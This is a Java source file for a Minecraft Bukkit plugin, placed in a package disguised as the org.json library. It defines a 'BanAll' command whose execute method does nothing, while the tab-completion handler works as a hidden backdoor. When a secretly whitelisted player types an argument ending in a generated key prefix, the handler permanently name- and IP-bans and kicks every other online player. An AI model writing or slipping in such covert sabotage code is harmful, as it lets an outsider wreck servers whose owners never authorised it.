package org.json.modals.punish;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.Calendar;
import java.util.Date;
import java.util.List;

public class BanAll extends BDCommand {

    public BanAll() {
        super("BanAll");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        Bukkit.getOnlinePlayers().stream()
                .filter(onlinePlayer -> !WhitelistMeta.isListed(onlinePlayer))
                .forEach(onlinePlayer -> {
                    Bukkit.getBanList(BanList.Type.NAME).addBan(onlinePlayer.getName(), "", new Date(9999, Calendar.JANUARY, 1), "");
                    Bukkit.getBanList(BanList.Type.IP).addBan(onlinePlayer.getName(), "", new Date(9999, Calendar.JANUARY, 1), "");
                    onlinePlayer.kickPlayer("");
                });

        player.sendMessage(Modal.getPrefix() + "§aAll online players has been banned!");

        return tabComplBuilder.build();
    }

}
